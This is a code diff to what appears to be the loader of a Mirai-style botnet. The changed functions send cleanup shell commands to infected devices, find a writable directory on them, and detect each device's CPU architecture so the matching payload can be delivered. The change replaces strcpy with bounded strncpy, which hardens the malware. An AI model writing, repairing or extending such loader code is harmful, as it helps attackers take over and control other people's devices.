@@ -440,9 +440,10 @@ int connection_consume_written_dirs(struct connection *conn)
         util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
         if (!found_writeable)
         {
-            if (pch_len < 31)
+            if (pch_len < sizeof(conn->info.writedir))
             {
-                strcpy(conn->info.writedir, pch);
+                strncpy(conn->info.writedir, pch, sizeof(conn->info.writedir) - 1);
+                conn->info.writedir[sizeof(conn->info.writedir) - 1] = '\0';
                 found_writeable = TRUE;
             }
             else
@@ -493,25 +494,41 @@ int connection_consume_arch(struct connection *conn)
         }
 
         /* arm mpsl spc m68k ppc x86 mips sh4 */
-        if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
-            strcpy(conn->info.arch, "arm");
+        if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64) {
+            strncpy(conn->info.arch, "arm", sizeof(conn->info.arch) - 1);
+            conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+        }
         else if (ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
         {
-            if (ehdr->e_ident[EI_DATA] == EE_LITTLE)
-                strcpy(conn->info.arch, "mpsl");
-            else
-                strcpy(conn->info.arch, "mips");
+            if (ehdr->e_ident[EI_DATA] == EE_LITTLE) {
+                strncpy(conn->info.arch, "mpsl", sizeof(conn->info.arch) - 1);
+                conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+            }
+            else {
+                strncpy(conn->info.arch, "mips", sizeof(conn->info.arch) - 1);
+                conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+            }
         }
-        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
-            strcpy(conn->info.arch, "x86");
-        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
-            strcpy(conn->info.arch, "spc");
-        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
-            strcpy(conn->info.arch, "m68k");
-        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
-            strcpy(conn->info.arch, "ppc");
-        else if (ehdr->e_machine == EM_SH)
-            strcpy(conn->info.arch, "sh4");
+        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64) {
+            strncpy(conn->info.arch, "x86", sizeof(conn->info.arch) - 1);
+            conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+        }
+        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9) {
+            strncpy(conn->info.arch, "spc", sizeof(conn->info.arch) - 1);
+            conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+        }
+        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K) {
+            strncpy(conn->info.arch, "m68k", sizeof(conn->info.arch) - 1);
+            conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+        }
+        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64) {
+            strncpy(conn->info.arch, "ppc", sizeof(conn->info.arch) - 1);
+            conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+        }
+        else if (ehdr->e_machine == EM_SH) {
+            strncpy(conn->info.arch, "sh4", sizeof(conn->info.arch) - 1);
+            conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
+        }
         else
         {
             conn->info.arch[0] = 0;
@@ -547,7 +564,8 @@ int connection_consume_arm_subtype(struct connection *conn)
 #ifdef DEBUG
         printf("[FD%d] Arch has ARMv7!\n", conn->fd);
 #endif
-        strcpy(conn->info.arch, "arm7");
+        strncpy(conn->info.arch, "arm7", sizeof(conn->info.arch) - 1);
+        conn->info.arch[sizeof(conn->info.arch) - 1] = '\0';
     }
 
     return offset;
